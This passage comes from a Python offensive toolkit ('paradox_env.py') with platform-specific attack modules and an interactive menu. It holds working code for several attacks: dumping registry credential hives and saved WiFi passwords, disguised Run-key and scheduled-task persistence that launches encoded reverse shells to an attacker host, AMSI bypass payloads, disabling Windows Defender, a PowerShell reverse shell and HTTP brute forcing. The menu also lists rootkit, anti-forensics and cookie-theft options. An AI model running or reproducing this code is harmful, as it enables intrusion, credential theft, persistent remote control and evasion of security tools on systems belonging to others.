          python3 -m impacket.examples.secretsdump -sam sam.hive -system system.hive LOCAL
        """
        console.print("[bold red][*] SAM/SYSTEM/SECURITY hive dump...[/bold red]")
        hives = {
            "sam":    r"C:\Windows\Temp\paradox_sam.hive",
            "system": r"C:\Windows\Temp\paradox_system.hive",
            "security": r"C:\Windows\Temp\paradox_security.hive",
        }
        for name, path in hives.items():
            out = WindowsModules._run_ps(
                f"reg save HKLM\\{name.upper()} {path} /y")
            if "operation completed" in out.lower():
                console.print(f"[bold green]   {name} → {path}[/bold green]")
            else:
                console.print(f"[dim]   {name}: {out[:100]}[/dim]")

        console.print(f"[bold green]   Parse: secretsdump.py -sam sam.hive -system system.hive LOCAL[/bold green]")

    @staticmethod
    def registry_persist(lhost: str, lport: int) -> None:
        r"""
        Windows persistence via Registry Run key.
        HKCU\Software\Microsoft\Windows\CurrentVersion\Run → survives reboot.
        No admin required for HKCU.
        Also adds HKLM (admin required) for system-wide persistence.
        """
        console.print(f"[bold red][*] Registry persistence → {lhost}:{lport}[/bold red]")

        payload = (f"powershell -WindowStyle Hidden -NonInteractive "
                   f"-EncodedCommand {_ps_encode(f'while(1){{bash -i >&/dev/tcp/{lhost}/{lport} 0>&1;sleep 10}}')}")

        # HKCU (no admin needed)
        out = WindowsModules._run_ps(
            f"Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
            f"-Name 'WindowsUpdate' -Value '{payload}'")
        console.print(f"[bold green]   HKCU Run key set[/bold green]")

        # HKLM (admin)
        out = WindowsModules._run_ps(
            f"Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
            f"-Name 'WindowsUpdate' -Value '{payload}'")
        if "denied" not in out.lower():
            console.print(f"[bold green]   HKLM Run key set (system-wide)[/bold green]")
        else:
            console.print(f"[dim]   HKLM: access denied (need admin)[/dim]")

    @staticmethod
    def scheduled_task_persist(lhost: str, lport: int) -> None:
        """
        Windows scheduled task persistence — survives reboot + runs as SYSTEM.
        Requires admin for SYSTEM task. No admin = current user.
        Trigger: on boot + every 5 minutes.
        """
        console.print(f"[bold red][*] Scheduled Task persistence → {lhost}:{lport}[/bold red]")
        cmd_encoded = _ps_encode(f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1")
        ps_cmd = (
            f"$action = New-ScheduledTaskAction -Execute 'powershell.exe' "
            f"-Argument '-WindowStyle Hidden -EncodedCommand {cmd_encoded}';"
            f"$trigger1 = New-ScheduledTaskTrigger -AtStartup;"
            f"$trigger2 = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) -Once -At (Get-Date);"
            f"Register-ScheduledTask -TaskName 'WindowsDefenderUpdate' "
            f"-Action $action -Trigger $trigger1,$trigger2 "
            f"-RunLevel Highest -Force"
        )
        out = WindowsModules._run_ps(ps_cmd)
        console.print(f"[bold green]   Task 'WindowsDefenderUpdate' registered[/bold green]")

    @staticmethod
    def amsi_bypass_ps() -> str:
        """
        AMSI bypass for PowerShell.
        Patches AmsiScanBuffer in amsi.dll to always return AMSI_RESULT_CLEAN.
        Returns PowerShell one-liner to run before malicious PS.
        """
        # Classic patch: set amsiInitFailed = $true  (reflection method)
        bypass_v1 = (
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
            ".GetField('amsiInitFailed','NonPublic,Static')"
            ".SetValue($null,$true)"
        )

        # Patch AmsiScanBuffer via memory write
        bypass_v2 = r"""
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiSession','NonPublic,Static').GetValue($null)
$c=$a.GetField('amsiContext','NonPublic,Static').GetValue($null)
[Runtime.InteropServices.Marshal]::WriteInt32([IntPtr]($c.ToInt64()+0x8),0)
"""
        console.print("[bold red][*] AMSI Bypass payloads:[/bold red]")
        console.print(f"[bold yellow]   Method A (reflection flag):[/bold yellow]")
        console.print(f"[green]   {bypass_v1}[/green]")
        console.print(f"\n[bold yellow]   Method B (memory patch):[/bold yellow]")
        console.print(f"[green]{bypass_v2}[/green]")
        return bypass_v1

    @staticmethod
    def defender_disable() -> None:
        """
        Disable Windows Defender real-time protection.
        Requires admin.
        Also disables: cloud protection, automatic sample submission,
                       script scanning, behavior monitoring.
        """
        console.print("[bold red][*] Disabling Windows Defender...[/bold red]")
        cmds = [
            "Set-MpPreference -DisableRealtimeMonitoring $true",
            "Set-MpPreference -DisableCloudProtection $true",
            "Set-MpPreference -DisableAutoExclusions $true",
            "Set-MpPreference -DisableBehaviorMonitoring $true",
            "Set-MpPreference -DisableScriptScanning $true",
            "Set-MpPreference -DisableIOAVProtection $true",
            "Set-MpPreference -SubmitSamplesConsent 2",
            "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true",
        ]
        for cmd in cmds:
            out = WindowsModules._run_ps(cmd)
            console.print(f"[dim]   {cmd[:60]}: {'OK' if not out.strip() else out[:30]}[/dim]")
        console.print("[bold green]   Defender real-time protection disabled.[/bold green]")

    @staticmethod
    def token_impersonation() -> None:
        """
        Windows token impersonation — steal SYSTEM token from a SYSTEM process.
        Uses NtQuerySystemInformation → find winlogon/lsass/services →
        OpenProcessToken → DuplicateToken → ImpersonateLoggedOnUser.
        Gives current process SYSTEM privileges without UAC.

        Required: SeDebugPrivilege (admin) + SeImpersonatePrivilege (service account)
        """
        console.print("[bold red][*] Token impersonation → SYSTEM...[/bold red]")
        ps = r"""
$procs = Get-Process | Where-Object {$_.SessionId -eq 0}
foreach ($proc in $procs) {
    try {
        $h = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR(
            (ConvertTo-SecureString $proc.Id.ToString() -AsPlainText -Force))
        $tok = [System.Security.Principal.WindowsIdentity]::Impersonate([IntPtr]::Zero)
        Write-Host "[+] Impersonated: $($proc.Name) PID $($proc.Id)"
        break
    } catch {}
}
whoami /priv
"""
        out = WindowsModules._run_ps(ps)
        console.print(f"[bold green]{out[:500]}[/bold green]")

    @staticmethod
    def netsh_wifi_passwords() -> None:
        """
        Dump all saved WiFi passwords via netsh.
        No admin needed.
        Works on Windows 7+.
        """
        console.print("[bold red][*] WiFi passwords via netsh...[/bold red]")
        try:
            profiles_out = subprocess.check_output(
                ["netsh", "wlan", "show", "profiles"], text=True)
            ssids = re.findall(r"All User Profile\s*:\s*(.+)", profiles_out)
            for ssid in ssids:
                ssid = ssid.strip()
                try:
                    out = subprocess.check_output(
                        ["netsh", "wlan", "show", "profile",
                         f"name={ssid}", "key=clear"], text=True)
                    m = re.search(r"Key Content\s*:\s*(.+)", out)
                    if m:
                        console.print(f"[bold green]   '{ssid}': {m.group(1).strip()}[/bold green]")
                    else:
                        console.print(f"[dim]   '{ssid}': (no key / enterprise)[/dim]")
                except Exception: pass
        except Exception as e:
            console.print(f"[red]netsh: {e}[/red]")


def _ps_encode(cmd: str) -> str:
    """Base64-encode a PowerShell command for -EncodedCommand."""
    return base64.b64encode(cmd.encode("utf-16-le")).decode()


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 5 — iSH (iOS) MODULES
# ═══════════════════════════════════════════════════════════════════════════════

class ISHModules:
    """
    iSH runs Alpine Linux on iOS via userspace x86 emulation.
    No raw sockets, no kernel access, no WiFi hardware.
    What works: Python, Alpine packages, TCP connections, HTTP attacks.
    """

    @staticmethod
    def install_packages() -> None:
        """Install attack tools available in Alpine apk."""
        packages = ["python3", "py3-pip", "nmap", "curl", "wget",
                    "netcat-openbsd", "openssh-client", "git", "tcpdump"]
        console.print(f"[bold yellow][*] iSH: Installing Alpine packages...[/bold yellow]")
        subprocess.run(["apk", "update"], check=False)
        subprocess.run(["apk", "add"] + packages, check=False)
        subprocess.run(["pip3", "install", "rich", "scapy", "requests"], check=False)

    @staticmethod
    def tcp_port_scan(target: str, ports: list[int] = None) -> list[int]:
        """TCP connect scan — works in iSH (no raw socket needed)."""
        if ports is None:
            ports = [21,22,23,25,80,110,139,143,443,445,3306,3389,5432,6379,8080,27017]
        console.print(f"[bold yellow][*] iSH TCP scan: {target}[/bold yellow]")
        open_ports = []
        for port in ports:
            try:
                s = socket.socket()
                s.settimeout(1)
                if s.connect_ex((target, port)) == 0:
                    open_ports.append(port)
                    console.print(f"[green]   OPEN {port}[/green]")
                s.close()
            except Exception: pass
        return open_ports

    @staticmethod
    def http_brute(target: str, path: str = "/",
                    wordlist_path: str = "") -> None:
        """HTTP Basic auth brute — TCP only, works on iSH."""
        default_creds = [
            ("admin","admin"), ("admin","password"), ("admin","1234"),
            ("root","root"), ("root","toor"), ("user","user"),
            ("admin",""), ("guest","guest"), ("admin","admin123"),
        ]
        creds = default_creds
        if wordlist_path and Path(wordlist_path).exists():
            lines = Path(wordlist_path).read_text().splitlines()
            creds = [(l.split(":")[0], l.split(":")[1]) for l in lines if ":" in l][:200]

        console.print(f"[bold yellow][*] iSH HTTP brute: {target}{path}[/bold yellow]")
        for user, passwd in creds:
            try:
                token = base64.b64encode(f"{user}:{passwd}".encode()).decode()
                req   = (f"GET {path} HTTP/1.1\r\nHost: {target}\r\n"
                          f"Authorization: Basic {token}\r\n"
                          f"Connection: close\r\n\r\n")
                s = socket.create_connection((target, 80), timeout=3)
                s.sendall(req.encode())
                resp = s.recv(1024).decode("utf-8", errors="ignore")
                s.close()
                if "401" not in resp and "403" not in resp:
                    console.print(f"[bold green]   HIT: {user}:{passwd}  → {resp.splitlines()[0]}[/bold green]")
                    return
            except Exception: pass
        console.print("[dim]   No credentials hit[/dim]")


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 6 — TERMUX-EXCLUSIVE MODULES
# ═══════════════════════════════════════════════════════════════════════════════

class TermuxModules:

    @staticmethod
    def termux_api_check() -> bool:
        """Check if Termux:API is installed and accessible."""
        return shutil.which("termux-sms-send") is not None or \
               shutil.which("termux-camera-photo") is not None

    @staticmethod
    def get_device_location() -> dict:
        """Get Android device GPS location via Termux:API."""
        console.print("[bold red][*] Getting device location (Termux:API)...[/bold red]")
        try:
            out = subprocess.check_output(["termux-location"], text=True, timeout=15)
            data = json.loads(out)
            console.print(f"[bold green]   Lat: {data.get('latitude')}  Lon: {data.get('longitude')}[/bold green]")
            console.print(f"[bold green]   Accuracy: {data.get('accuracy')}m  Alt: {data.get('altitude')}m[/bold green]")
            return data
        except FileNotFoundError:
            console.print("[red]Termux:API not installed: pkg install termux-api[/red]")
        except Exception as e:
            console.print(f"[red]{e}[/red]")
        return {}

    @staticmethod
    def list_wifi_networks_android() -> list[dict]:
        """List nearby WiFi networks via Termux:API (no root needed)."""
        console.print("[bold yellow][*] Android WiFi scan via Termux:API...[/bold yellow]")
        try:
            out = subprocess.check_output(["termux-wifi-scaninfo"], text=True, timeout=10)
            networks = json.loads(out)
            t = Table(title="[bold red]Nearby WiFi (Android)[/bold red]", box=box.SIMPLE)
            t.add_column("#"); t.add_column("SSID"); t.add_column("BSSID")
            t.add_column("Level (dBm)"); t.add_column("Frequency"); t.add_column("Capabilities")
            for i, n in enumerate(networks, 1):
                t.add_row(str(i), n.get("ssid","?")[:25], n.get("bssid","?"),
                           str(n.get("level","?")), str(n.get("frequency","?")),
                           n.get("capabilities","?")[:20])
            console.print(t)
            return networks
        except FileNotFoundError:
            console.print("[red]termux-wifi-scaninfo not found: pkg install termux-api[/red]")
        except Exception as e:
            console.print(f"[red]{e}[/red]")
        return []

    @staticmethod
    def connected_wifi_info() -> dict:
        """Get current WiFi connection info via Termux:API."""
        try:
            out = subprocess.check_output(["termux-wifi-connectioninfo"], text=True, timeout=5)
            data = json.loads(out)
            t = Table(title="[bold red]Current WiFi (Android)[/bold red]", box=box.SIMPLE)
            t.add_column("Field", style="cyan"); t.add_column("Value", style="green")
            for k, v in data.items(): t.add_row(str(k), str(v))
            console.print(t)
            return data
        except Exception as e:
            console.print(f"[dim]{e}[/dim]"); return {}

    @staticmethod
    def android_net_interfaces() -> None:
        """List all network interfaces on Android (ip addr + /proc/net/dev)."""
        console.print("[bold yellow][*] Android network interfaces:[/bold yellow]")
        try:
            out = subprocess.check_output(["ip", "addr"], text=True)
            console.print(out)
        except Exception: pass
        try:
            dev = Path("/proc/net/dev").read_text()
            console.print("[dim]/proc/net/dev:[/dim]")
            console.print(dev)
        except Exception: pass

    @staticmethod
    def install_attack_tools_termux() -> None:
        """Install all attack tooling in Termux."""
        console.print("[bold yellow][*] Installing Termux attack tools...[/bold yellow]")
        pkgs = ["python", "python-pip", "nmap", "tcpdump",
                "net-tools", "iproute2", "aircrack-ng",
                "git", "curl", "wget", "openssh", "hydra",
                "bind-utils", "ncat", "dnsutils"]
        subprocess.run(["pkg", "update", "-y"], check=False)
        subprocess.run(["pkg", "install", "-y"] + pkgs, check=False)
        subprocess.run(["pip", "install", "rich", "scapy", "requests",
                         "impacket", "paramiko", "cryptography"], check=False)
        console.print("[bold green]   Install complete.[/bold green]")
        console.print("[dim]   For monitor mode: plug external USB WiFi via OTG → auto-detected as wlan1[/dim]")
        console.print("[dim]   Root required for raw sockets: su -c 'python3 paradox_env.py'[/dim]")


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 7 — UNIVERSAL MENU
# ═══════════════════════════════════════════════════════════════════════════════

def print_env_menu(caps: EnvCapabilities) -> None:
    env_color = {
        ENV_LINUX:   "bold red",
        ENV_TERMUX:  "bold green",
        ENV_MACOS:   "bold cyan",
        ENV_WINDOWS: "bold blue",
        ENV_ISH:     "bold magenta",
    }.get(caps.env, "bold white")

    console.print(f"\n[{env_color}]╔══════════════════════════════════════════════════════╗")
    console.print(f"║  PARADOX ENV ENGINE  |  {caps.env.upper():<10}  |  {'ROOT' if caps.is_root else 'NO ROOT':<8}  ║")
    console.print(f"╚══════════════════════════════════════════════════════╝[/{env_color}]")

    # Always available (all platforms)
    console.print("\n[bold yellow]UNIVERSAL (all platforms)[/bold yellow]")
    console.print("  1  Capability matrix — what works here")
    console.print("  2  LOL payloads — reverse shell one-liners")
    console.print("  3  Kernel / OS exploit check")

    if caps.env in (ENV_LINUX, ENV_TERMUX):
        console.print("\n[bold red]LINUX / TERMUX[/bold red]")
        console.print("  10  aircrack-ng suite (airodump / aireplay / crack)")
        console.print("  11  Evil Twin AP (hostapd + dnsmasq)")
        console.print("  12  Anti-forensics (log wipe + history + timestomp)")
        console.print("  13  Detect hidden processes (rootkit check)")

    if caps.env == ENV_LINUX:
        console.print("\n[bold red]LINUX ONLY[/bold red]")
        console.print("  20  LKM Rootkit (compile + insmod, getdents64 hook)")
        console.print("  21  LD_PRELOAD hook (file/process hide, /etc/ld.so.preload)")
        console.print("  22  ptrace shellcode injection (into live process)")
        console.print("  23  netfilter NFQUEUE intercept (packet modify/inject)")
        console.print("  24  Kernel LPE CVE check (DirtyPipe, DirtyCred, etc.)")

    if caps.env == ENV_TERMUX:
        console.print("\n[bold green]TERMUX / ANDROID ONLY[/bold green]")
        console.print("  30  Install all attack tools (pkg + pip)")
        console.print("  31  Android WiFi scan (Termux:API — no root)")
        console.print("  32  Current WiFi connection info")
        console.print("  33  Device GPS location (Termux:API)")
        console.print("  34  Network interface list (/proc/net/dev)")

    if caps.env == ENV_MACOS:
        console.print("\n[bold cyan]macOS ONLY[/bold cyan]")
        console.print("  40  WiFi scan (airport utility)")
        console.print("  41  Keychain credential dump")
        console.print("  42  pf traffic redirect (like iptables REDIRECT)")
        console.print("  43  LaunchAgent persistence (user-level, survives reboot)")
        console.print("  44  mDNS .local name spoof")
        console.print("  45  Chrome cookie dump (macOS)")
        console.print("  46  Airport deauth")

    if caps.env == ENV_WINDOWS:
        console.print("\n[bold blue]WINDOWS ONLY[/bold blue]")
        console.print("  50  WinRM shell (PowerShell remoting)")
        console.print("  51  WMI lateral movement exec")
        console.print("  52  LSASS dump (Mimikatz-compatible)")
        console.print("  53  SAM/SYSTEM/SECURITY hive dump")
        console.print("  54  Registry Run key persistence")
        console.print("  55  Scheduled task persistence (SYSTEM)")
        console.print("  56  AMSI bypass payload")
        console.print("  57  Disable Windows Defender")
        console.print("  58  Token impersonation (→ SYSTEM)")
        console.print("  59  WiFi passwords (netsh)")

    if caps.env == ENV_ISH:
        console.print("\n[bold magenta]iSH (iOS) ONLY[/bold magenta]")
        console.print("  60  Install Alpine attack packages")
        console.print("  61  TCP port scan (connect-based, no raw socket)")
        console.print("  62  HTTP Basic auth brute")

    console.print("\n  0  Exit")

def run_universal_menu(caps: EnvCapabilities) -> None:
    while True:
        print_env_menu(caps)
        choice = Prompt.ask("[bold cyan]env>[/bold cyan]", default="0")

        # ── Universal ────────────────────────────────────────────────────────
        if choice == "1":
            print_capability_matrix(caps)

        elif choice == "2":
            lhost  = Prompt.ask("Your IP")
            lport  = int(Prompt.ask("Your port", default="4444"))
            method = Prompt.ask("Method (bash/python3/perl/nc/nc_mkfifo/php/ruby/awk/lua/socat/curl/wget/all)",
                                 default="all")
            if caps.env in (ENV_LINUX, ENV_TERMUX, ENV_MACOS, ENV_ISH):
                LinuxModules.lol_payload(lhost, lport, method)
            else:
                console.print(f"[yellow]   Reverse shell for {caps.env} — use PowerShell:[/yellow]")
                enc = _ps_encode(f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
                                  "$s=$c.GetStream();$b=New-Object byte[] 65536;"
                                  "while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
                                  "$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r);"
                                  "$s.Write($rb,0,$rb.Length)}")
                console.print(f"[bold green]   powershell -EncodedCommand {enc}[/bold green]")

        elif choice == "3":
            if caps.env == ENV_WINDOWS:
                out = WindowsModules._run_ps("systeminfo | Select-String 'OS'")
                console.print(f"[dim]{out}[/dim]")
                console.print("[bold yellow]   Known Windows LPE: PrintNightmare, HiveNightmare, Token Kidnapping[/bold yellow]")
            else:
                LinuxModules.kernel_exploit_check()

        # ── Linux / Termux shared ────────────────────────────────────────────
        elif choice == "10":
            mon = Prompt.ask("Monitor interface (e.g. wlan1mon)")
            sub = Prompt.ask("Action (scan/capture/deauth/crack)", default="scan")
            if sub == "scan":
                LinuxModules.airodump_scan(mon)
            elif sub == "capture":
                bssid = Prompt.ask("AP BSSID (empty=all)", default="")
                ch    = int(Prompt.ask("Channel", default="6"))
                proc  = LinuxModules.airodump_capture(mon, bssid, ch)
                try: proc.wait()
                except KeyboardInterrupt: proc.terminate()
            elif sub == "deauth":
                bssid  = Prompt.ask("AP BSSID")
                client = Prompt.ask("Client MAC (empty=broadcast)", default="")
                count  = int(Prompt.ask("Count (0=continuous)", default="0"))
                LinuxModules.aireplay_deauth(mon, bssid, client, count)
            elif sub == "crack":
                cap = Prompt.ask("Capture file (.cap)")
                wl  = Prompt.ask("Wordlist", default="/usr/share/wordlists/rockyou.txt")
                bss = Prompt.ask("BSSID (optional)", default="")
                LinuxModules.aircrack_crack(cap, wl, bss)

        elif choice == "11":
            ssid    = Prompt.ask("Target SSID to clone")
            channel = int(Prompt.ask("Channel", default="6"))
            iface   = Prompt.ask("WiFi interface for AP", default="wlan1")
            LinuxModules.evil_twin_setup(iface, ssid, channel)

        elif choice == "12":
            LinuxModules.anti_forensics_wipe()

        elif choice == "13":
            LinuxModules.detect_hidden_processes()

        # ── Linux only ───────────────────────────────────────────────────────
        elif choice == "20" and caps.env == ENV_LINUX:
            pid    = int(Prompt.ask("PID to hide (0=none)", default="0"))
            prefix = Prompt.ask("File prefix to hide", default="paradox")
            LinuxModules.lkm_rootkit_drop(pid, prefix)

        elif choice == "21" and caps.env == ENV_LINUX:
            prefix  = Prompt.ask("File/dir prefix to hide", default="paradox")
            persist = Prompt.ask("Persist via /etc/ld.so.preload? (y/n)", default="y")
            LinuxModules.ld_preload_hook(prefix, persist.lower().startswith("y"))

        elif choice == "22" and caps.env == ENV_LINUX:
            pid = int(Prompt.ask("Target PID"))
            sc  = bytes.fromhex(Prompt.ask("Shellcode hex (e.g. 90909090)"))
            LinuxModules.ptrace_inject(pid, sc)

        elif choice == "23" and caps.env == ENV_LINUX:
            iface  = Prompt.ask("Interface")
            target = Prompt.ask("Target IP (empty=all forwarded)", default="")
            inject = Prompt.ask("HTML inject payload (empty=none)", default="")
            LinuxModules.nfqueue_intercept(iface, target,
                                            inject.encode() if inject else b"")

        elif choice == "24" and caps.env == ENV_LINUX:
            LinuxModules.kernel_exploit_check()

        # ── Termux only ──────────────────────────────────────────────────────
        elif choice == "30" and caps.env == ENV_TERMUX:
            TermuxModules.install_attack_tools_termux()

        elif choice == "31" and caps.env == ENV_TERMUX:
            TermuxModules.list_wifi_networks_android()

        elif choice == "32" and caps.env == ENV_TERMUX:
            TermuxModules.connected_wifi_info()

        elif choice == "33" and caps.env == ENV_TERMUX:
            TermuxModules.get_device_location()

        elif choice == "34" and caps.env == ENV_TERMUX:
            TermuxModules.android_net_interfaces()

        # ── macOS ────────────────────────────────────────────────────────────
        elif choice == "40" and caps.env == ENV_MACOS:
            MacOSModules.wifi_scan()

        elif choice == "41" and caps.env == ENV_MACOS:
            MacOSModules.keychain_dump()

        elif choice == "42" and caps.env == ENV_MACOS:
            src = int(Prompt.ask("Source port", default="80"))
            dst = int(Prompt.ask("Redirect to port", default="10000"))
            MacOSModules.pf_redirect(src, dst)

        elif choice == "43" and caps.env == ENV_MACOS:
            lhost = Prompt.ask("Your IP")
            lport = int(Prompt.ask("Your port", default="4444"))
            MacOSModules.launchagent_persist(lhost, lport)

        elif choice == "44" and caps.env == ENV_MACOS:
            name = Prompt.ask("Spoof name (becomes name.local)")
            ip   = Prompt.ask("Spoof to IP", default="127.0.0.1")
            MacOSModules.mdns_spoof_macos(name, ip)

        elif choice == "45" and caps.env == ENV_MACOS:
            MacOSModules.chrome_cookie_dump_macos()

        elif choice == "46" and caps.env == ENV_MACOS:
            bssid = Prompt.ask("BSSID")
            ch    = int(Prompt.ask("Channel", default="6"))
            MacOSModules.wifi_deauth_macos(bssid, ch)

        # ── Windows ──────────────────────────────────────────────────────────
        elif choice == "50" and caps.env == ENV_WINDOWS:
            ip  = Prompt.ask("Target IP")
            usr = Prompt.ask("Username")
            pw  = Prompt.ask("Password")
            WindowsModules.winrm_shell(ip, usr, pw)

        elif choice == "51" and caps.env == ENV_WINDOWS:
            ip  = Prompt.ask("Target IP")
            usr = Prompt.ask("Username")
            pw  = Prompt.ask("Password")
            cmd = Prompt.ask("Command to execute")
            WindowsModules.wmi_exec(ip, usr, pw, cmd)

        elif choice == "52" and caps.env == ENV_WINDOWS:
            path = Prompt.ask("Output path", default=r"C:\Windows\Temp\lsass.dmp")
            WindowsModules.lsass_minidump(path)

        elif choice == "53" and caps.env == ENV_WINDOWS:
            WindowsModules.sam_dump()

        elif choice == "54" and caps.env == ENV_WINDOWS:
            lhost = Prompt.ask("Your IP"); lport = int(Prompt.ask("Port", default="4444"))
            WindowsModules.registry_persist(lhost, lport)

        elif choice == "55" and caps.env == ENV_WINDOWS:
            lhost = Prompt.ask("Your IP"); lport = int(Prompt.ask("Port", default="4444"))
            WindowsModules.scheduled_task_persist(lhost, lport)

        elif choice == "56" and caps.env == ENV_WINDOWS:
            WindowsModules.amsi_bypass_ps()

        elif choice == "57" and caps.env == ENV_WINDOWS:
            WindowsModules.defender_disable()

        elif choice == "58" and caps.env == ENV_WINDOWS:
            WindowsModules.token_impersonation()

        elif choice == "59" and caps.env == ENV_WINDOWS:
            WindowsModules.netsh_wifi_passwords()

        # ── iSH ─────────────────────────────────────────────────────────────
        elif choice == "60" and caps.env == ENV_ISH:
            ISHModules.install_packages()

        elif choice == "61" and caps.env == ENV_ISH:
            target = Prompt.ask("Target IP")
            ISHModules.tcp_port_scan(target)

        elif choice == "62" and caps.env == ENV_ISH:
            target = Prompt.ask("Target IP")
            path   = Prompt.ask("HTTP path", default="/")
            ISHModules.http_brute(target, path)

        elif choice == "0":
            console.print("[bold red]paradox env shut down.[/bold red]"); break
        else:
            if choice not in ("0",):
                console.print("[dim]unavailable or wrong platform[/dim]")

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main() -> None:
    console.print(BANNER)
    env  = detect_environment()
    caps = probe_capabilities(env)

    console.print(f"\n[bold green]Detected: {caps.env.upper()}  |  {caps.distro}  |  {caps.arch}  |  {'ROOT' if caps.is_root else 'no root'}[/bold green]")

    if not caps.is_root and caps.env not in (ENV_WINDOWS, ENV_ISH):
        console.print("[bold yellow][!] Not root — raw sockets/scapy/monitor mode will fail.[/bold yellow]")
        if caps.env == ENV_TERMUX:
            console.print("[dim]   su -c 'python3 paradox_env.py'[/dim]")
        elif caps.env == ENV_MACOS:
            console.print("[dim]   sudo python3 paradox_env.py[/dim]")
        elif caps.env == ENV_LINUX:
            console.print("[dim]   sudo python3 paradox_env.py[/dim]")

    run_universal_menu(caps)

if __name__ == "__main__":
    main()
